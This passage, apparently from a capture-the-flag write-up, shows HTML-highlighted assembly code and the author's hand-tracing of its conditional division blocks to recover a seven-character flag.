&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@if1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;CMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JNE  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@true1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit1:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@if2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;CMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JNE  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@true2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit2:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SHL  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;ADD  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;LEA  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@main_exit
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@main_exit:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;POP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;RET 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Yeah, I know &lt;code&gt;Assembly&lt;&#x2F;code&gt;. There are &lt;code&gt;7&lt;&#x2F;code&gt; memory locations are initialized I thought that it was 7 character long flag. So, I started solving it by hand.&lt;&#x2F;p&gt;
&lt;p&gt;Let me clearly explain the first &lt;code&gt;if&lt;&#x2F;code&gt; block.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;asm&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-asm &quot;&gt;&lt;code class=&quot;language-asm&quot; data-lang=&quot;asm&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@if0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;CMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; %&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JNE  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@true0:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DIV  &lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;%0&lt;&#x2F;span&gt;&lt;span&gt;, -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)          &#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;) = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;154 &lt;&#x2F;span&gt;&lt;span&gt;--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;77&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;JMP  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@exit0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@false0:
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;-28(%BP)&lt;&#x2F;code&gt; is the location of value &lt;code&gt;154&lt;&#x2F;code&gt; and &lt;code&gt;$2&lt;&#x2F;code&gt; is just an integer.&lt;br&gt;&lt;code&gt;DIV 154,2&lt;&#x2F;code&gt; is stored in &lt;code&gt;%0&lt;&#x2F;code&gt;&lt;br&gt;
The result &lt;code&gt;77&lt;&#x2F;code&gt; is compared with the value present in &lt;code&gt;%12&lt;&#x2F;code&gt; location&lt;br&gt; I assumed It was true, So the &lt;code&gt;@true0&lt;&#x2F;code&gt; will be executed.&lt;br&gt; The true block is just doing DIV again and stored the value at &lt;code&gt;-28(%BP)&lt;&#x2F;code&gt;, which means the &lt;code&gt;158&lt;&#x2F;code&gt; is erased and &lt;code&gt;77&lt;&#x2F;code&gt; is stored inplace of it.&lt;&#x2F;p&gt;
&lt;p&gt;By this way, I traced all the conditions. Most of the time I assumed the condition was true. Only when I got the result in decimal points marked it as false and excuted the false block.&lt;&#x2F;p&gt;
&lt;p&gt;Here is my rough work of the challenge.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;asm&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-asm &quot;&gt;&lt;code class=&quot;language-asm&quot; data-lang=&quot;asm&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;PUSH &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;MOV  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;BP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@main_body:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;SUB  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;SP
